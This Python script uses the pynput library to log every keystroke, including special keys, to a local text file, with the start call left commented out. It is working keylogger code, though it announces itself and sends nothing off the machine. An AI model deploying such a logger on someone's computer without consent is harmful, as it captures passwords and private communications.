from pynput.keyboard import Key, Listener

def on_press(key):
    """
    Callback function that fires whenever a key is pressed.
    """
    try:
        # Append the key character to a log file
        with open("keylog.txt", "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (Space, Enter, etc.)
        with open("keylog.txt", "a") as log:
            log.write(f" [{key}] ")

def start_logger():
    """Starts the keyboard listener."""
    print("--- Logger started (Press Ctrl+C to stop) ---")
    with Listener(on_press=on_press) as listener:
        listener.join()

# To run this, you must install the library: pip install pynput
# start_logger()
